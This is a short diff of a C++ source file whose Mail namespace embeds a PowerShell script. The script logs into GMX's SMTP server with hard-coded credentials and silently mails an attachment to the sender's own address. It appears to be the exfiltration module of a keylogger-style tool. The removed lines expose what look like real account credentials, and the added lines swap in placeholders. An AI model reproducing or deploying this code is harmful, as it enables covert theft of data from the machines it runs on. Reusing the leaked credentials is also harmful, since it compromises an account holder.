@@ -12,8 +12,8 @@
 
 namespace Mail
 {
-    #define X_EM_FROM "78c78aa7s1opaas@gmx.com"
-    #define X_EM_PASS "7d8ascyber7kjsa*"
+    #define X_EM_FROM "tuusuario@gmx.com"
+    #define X_EM_PASS "tuclave"
 
 const std::string &PowerShellScript = "Param([String]$Att,[String]$Subj,[String]$Body)\nFunction Send-Email{\n\tParam (\n\t\t[Parameter(`\n\t\t\tMandatory=$true)]\n\t\t[String]$From,\n\t\t[Parameter(`\n\t\t\tMandatory=$true)]\n\t\t[String]$Pass)\n\t$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)\n\ttry\n\t{\n\t\tsend-mailmessage -from $From -to $From -subject $Subj -body $Body -Attachment $Att -smtpServer \"mail.gmx.com\" -port 587 -credential $credentials -usessl\n\t\texit 7;\n\t}\n\tcatch\n\t{\n\t\texit 3;\n\t}\n}\nSend-EMail -From \"" + std::string (X_EM_FROM) + "\" -Pass \"" + std::string (X_EM_PASS) + "\"";
 
